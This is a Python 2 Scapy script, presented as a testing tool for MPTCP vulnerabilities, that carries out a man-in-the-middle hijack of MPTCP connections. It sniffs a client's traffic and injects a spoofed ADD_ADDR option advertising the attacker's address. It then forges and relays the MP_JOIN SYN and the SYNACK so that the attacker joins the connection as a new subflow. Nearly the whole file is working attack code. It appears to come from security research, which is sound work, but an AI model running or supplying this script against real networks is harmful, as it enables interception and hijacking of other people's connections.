#Author: fabriziodemaria

import logging
import threading
import sys
from random import randint

logging.getLogger("scapy.runtime").setLevel(logging.DEBUG)
from scapy.all import *
from scapy.layers.inet import TCP, IP, Neighbor
from scapy.layers import mptcp
from scapy.sendrecv import sr1
from netaddr import *
from subprocess import check_output as execCommand
from sniff_script import *


ADDRESS_ID = 6
SYN_TRANSMITTED = 1 #TODO values different than 1 might cause problems
THREAD_SYNC_TIME = 1

class SYNThread (threading.Thread):
    pkt = None
    def __init__(self, threadID, name, counter, clientIf):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.clientIf = clientIf
    def run(self):
        self.pkt = sniff_SYN(self.clientIf)


class SYNACKThread (threading.Thread):
    pkt = None
    def __init__(self, threadID, name, counter, serverIf, serverIP):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.serverIf = serverIf
        self.serverIP = serverIP
    def run(self):
        self.pkt = sniff_SYNACK(self.serverIf, self.serverIP)


class ACKThread (threading.Thread):
    pkt = None
    def __init__(self, threadID, name, counter, clientIf, myIP):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.clientIf = clientIf
        self.myIP = myIP
    def run(self):
        self.pkt = sniff_ACK(self.clientIf, self.myIP)


def sniff_ACK(clientIf, myIP):
    print "Start looking for ACK"
    pkt = sniff_first_ack(clientIf, myIP)
    return pkt


def sniff_SYNACK(serverIf, serverIP):
    print "Start looking for SYNACK"
    pkt = sniff_first_synack(serverIf, serverIP)
    return pkt


def sniff_SYN(clientIf):
    print "Start looking for SYN"
    pkt = sniff_first_syn(clientIf)
    return pkt


def generateAddAddr(myIP, srcIP, srcPort, dstIP, dstPort, sniffedSeq, sniffedAck):
    pkt = (IP(version=4L,src=srcIP,dst=dstIP)/                            \
             TCP(sport=srcPort,dport=dstPort,flags="A",seq=sniffedSeq,ack=sniffedAck,\
                 options=[TCPOption_MP(mptcp=MPTCP_AddAddr(address_id=ADDRESS_ID,\
                                                           adv_addr=myIP))]))
    return pkt


def modify_addr_id(pkt, aid):
    rcv = 0x00000000
    snd = 0x00000000
    bkp = 0L
    modified_options = []
    for opt in pkt[TCP].options:
        if opt.kind == 30:
            for o in opt.mptcp:
                if MPTCP_subtypes[o.subtype] == "MP_JOIN":
                    rcv = o.rcv_token
                    snd = o.snd_nonce
                    bkp = o.backup_flow
                    modified_options.append(TCPOption_MP(mptcp=MPTCP_JoinSYN(
                                        addr_id=aid,
                                        backup_flow=bkp,
                                        rcv_token=rcv,
                                        snd_nonce=snd)))
        else:
            modified_options.append(opt)
    pkt[TCP].options = modified_options
    return pkt


def sniff_start_lambda(p, srcIP):
    if p.haslayer(TCP):
        str = p.sprintf("%IP.src%")
        if str == srcIP:
            return True
    return False


def forge_synack(pkt, myIP, serverIP, clientIP, clientIf, clientPort):
    # Modify SYNACK from server
    pkt[IP].dst = clientIP
    pkt[IP].src = myIP
    pkt[TCP].dport = clientPort
    # Ethernet src/dst has to be updated in the forward phase
    pkt2 = sniff_first_start(clientIf, serverIP)
    del pkt[Ether].src
    pkt[Ether].dst = pkt2[Ether].dst
    # Delete the checksum to allow for automatic recalculation
    del pkt[IP].chksum
    del pkt[TCP].chksum
    return pkt


def forge_syn(pkt, myIP, serverIP, clientIP, serverIf, serverEth):
    # Modify SYN from Client
    pkt[IP].dst = serverIP
    pkt[IP].src = myIP
    pkt = modify_addr_id(pkt, ADDRESS_ID) # Might be not necessary

    # Ethernet src/dst has to be updated in the forward phase
    del pkt[Ether].src
    pkt[Ether].dst = serverEth

    # Delete the checksum to allow for automatic recalculation
    del pkt[IP].chksum
    del pkt[TCP].chksum

    # Genereting the list
    listp = []
    for i in range(0, SYN_TRANSMITTED):
        # pkt[TCP].sport += randint(10,500)
        listp.append(pkt.copy())
    return listp


def parse_args():
    import argparse
    import itertools
    import sys

    parser = argparse.ArgumentParser(description='Testing tool for MPTCP vulnerabilities. Requires root privileges for scapy.')
    parser.add_argument('myIP', action='store', help='My IP address')
    parser.add_argument('serverIP', action='store', help='Server IP address')
    parser.add_argument('clientIP', action='store', help='Client IP address')
    parser.add_argument('serverIf', action='store', help='Interface name to server')
    parser.add_argument('clientIf', action='store', help='Interface name to client')
    if len(sys.argv)!=6:
        parser.print_help()
        sys.exit(1)
    return parser.parse_args()


def main():
    args = parse_args()

    MY_IP = args.myIP
    CLIENT_IP = args.clientIP
    SERVER_IP = args.serverIP
    CLIENT_IF = args.clientIf
    SERVER_IF = args.serverIf


    # Start waiting for SYN from client
    thread1 = SYNThread(1, "Syn capturing thread", 1, CLIENT_IF)
    thread1.start()
    time.sleep(THREAD_SYNC_TIME) # Give time to thread1 to start tcpdumping

    pktl = sniff(iface=CLIENT_IF, lfilter=lambda p: sniff_start_lambda(p, CLIENT_IP), count=1)
    pktl2 = sniff(iface=SERVER_IF, lfilter=lambda p: sniff_start_lambda(p, CLIENT_IP), count=1)

    CLIENT_ETHER = pktl[0][Ether].src
    SERVER_ETHER = pktl2[0][Ether].dst

    # Sending ADD_ADDR to client
    print "Sending ADD_ADDR to client"
    send(generateAddAddr(MY_IP, SERVER_IP, pktl[0][TCP].dport, CLIENT_IP, pktl[0][TCP].sport, (pktl[0][TCP].ack), (pktl[0][TCP].seq)-1000*1427), iface=CLIENT_IF, verbose=0)

    thread1.join() # This should contain the received SYN from the client
    # thread1.pkt.show()
    print "Phase 1 - Received SYN from client"

    # Start waiting for SYNACK from server
    thread2 = SYNACKThread(1, "SynAck capturing thread", 1, SERVER_IF, SERVER_IP)
    thread2.start()
    time.sleep(THREAD_SYNC_TIME) # Give time to thread2 to start tcpdumping

    # Sending SYN to server. Also needed Ethernet information from previous stage just to avoid sniffing again
    listp = forge_syn(thread1.pkt.copy(), MY_IP, SERVER_IP, CLIENT_IP, SERVER_IF, SERVER_ETHER)
    print "Sending SYN to server"
    sendp(listp, iface=SERVER_IF, verbose=0)

    thread2.join() # This should contain the received SYNACK from the server
    # thread2.pkt.show()

    print "Phase 2 - Received SYNACK from server"

    # Start waiting for the ACK from the client
    thread3 = ACKThread(1, "Ack capturing thread", 1, CLIENT_IF, MY_IP)
    thread3.start()
    time.sleep(THREAD_SYNC_TIME) # Give time to thread3 to start tcpdumping

    # Sending SYNACK to the client
    pkt = forge_synack(thread2.pkt, MY_IP, SERVER_IP, CLIENT_IP, CLIENT_IF, thread1.pkt[TCP].sport)
    print "Sending SYNACK to client"
    # pkt.show2()
    sendp(pkt.copy(), iface=CLIENT_IF, verbose=0)

    thread3.join() # This should contain the received ACK from the client
    thread3.pkt.show()
    print "Phase 3 - Received ACK from the client"

    return

if __name__ == "__main__":
    main()
